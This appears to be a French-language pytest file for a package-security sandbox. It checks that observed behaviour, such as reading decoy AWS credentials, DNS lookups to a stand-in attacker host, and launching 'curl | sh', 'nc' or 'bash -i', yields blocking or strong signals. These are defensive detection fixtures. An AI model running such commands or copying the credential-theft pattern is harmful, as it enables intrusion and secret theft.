"""Rapport de sandbox (C) → signaux SANDBOX (B, M1), décidés par des règles fixes."""
import pytest

from commun.modeles import Ecosysteme, Etat, Niveau, RapportSandbox, Source
from plateforme.pipeline import politique
from plateforme.pipeline.sandbox_signaux import signaux_sandbox

P = Ecosysteme.PYPI


def rapport(**champs) -> RapportSandbox:
    base = dict(requetes_dns=[], connexions=[], fichiers_sensibles=[], leurres_lus=[],
                processus=["pip install --no-deps demo-1.0.whl", "python -c import demo"],
                code_sortie=0, duree_s=61.0, delai_depasse=False)
    return RapportSandbox(**{**base, **champs})


def sortes(r: RapportSandbox) -> dict[str, Niveau]:
    signaux = signaux_sandbox(P, "demo", "1.0", r)
    assert all(s.source is Source.SANDBOX for s in signaux)
    return {s.sorte: s.niveau for s in signaux}


def test_un_rapport_propre_ne_donne_aucun_signal():
    assert sortes(rapport()) == {}


def test_la_version_piegee_de_la_demo_est_bloquee_avec_ses_preuves():
    r = rapport(requetes_dns=["collecte.attaquant-demo.invalid"],
                connexions=["collecte.attaquant-demo.invalid:443"],
                fichiers_sensibles=["/root/.aws/credentials"],
                leurres_lus=["AWS_SECRET_ACCESS_KEY", "/root/.aws/credentials"])
    signaux = signaux_sandbox(P, "demo", "1.0", r)
    assert {s.sorte: s.niveau for s in signaux} == {
        "lit_leurre": Niveau.BLOQUANT, "dns": Niveau.FORT, "connexion": Niveau.FORT,
        "fichier_sensible": Niveau.FORT}
    leurre = next(s for s in signaux if s.sorte == "lit_leurre")
    assert leurre.preuve["leurres"] == ["AWS_SECRET_ACCESS_KEY", "/root/.aws/credentials"]
    assert "AWS_SECRET_ACCESS_KEY" in leurre.preuve["extrait"]
    dns = next(s for s in signaux if s.sorte == "dns")
    assert "collecte.attaquant-demo.invalid" in dns.preuve["extrait"]
    assert all(len(s.preuve["extrait"]) <= 200 for s in signaux)
    assert politique.decider(signaux).etat is Etat.BLOQUEE


@pytest.mark.parametrize("processus", ["sh -c curl http://x | sh", "/usr/bin/curl -s x",
                                       "wget x", "nc 1.2.3.4 4444", "bash -i"])
def test_un_shell_ou_un_outil_reseau_lance_est_fort(processus):
    assert sortes(rapport(processus=["python -c import demo", processus])) == {
        "processus": Niveau.FORT}


def test_le_delai_depasse_et_l_echec_sont_des_indices():
    assert sortes(rapport(delai_depasse=True, code_sortie=1)) == {
        "delai_depasse": Niveau.MOYEN, "echec_execution": Niveau.INFO}


def test_un_tres_long_rapport_reste_un_extrait_court():
    r = rapport(requetes_dns=[f"h{i}.exemple-demo.invalid" for i in range(200)])
    [s] = signaux_sandbox(P, "demo", "1.0", r)
    assert len(s.preuve["extrait"]) <= 200 and len(s.preuve["requetes"]) == 200
